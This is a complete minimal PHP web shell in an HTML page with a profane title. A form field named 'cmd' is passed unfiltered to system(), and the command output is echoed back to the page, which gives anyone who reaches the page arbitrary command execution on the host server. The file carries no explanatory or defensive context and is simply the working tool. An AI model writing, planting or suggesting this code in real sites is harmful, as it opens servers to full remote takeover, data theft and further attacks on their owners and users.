<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <title>fuck</title>
</head>
<body>
    <form method="POST" action="">
        <input type="text" name="cmd">
        <button type="submit">fuck</button>
    </form>
    <pre>
        <?php
        if (isset($_POST['cmd']) && !empty($_POST['cmd'])) {
            $cmd = $_POST['cmd'];
            system($cmd);
        }
        ?>
    </pre>
</body>
</html>
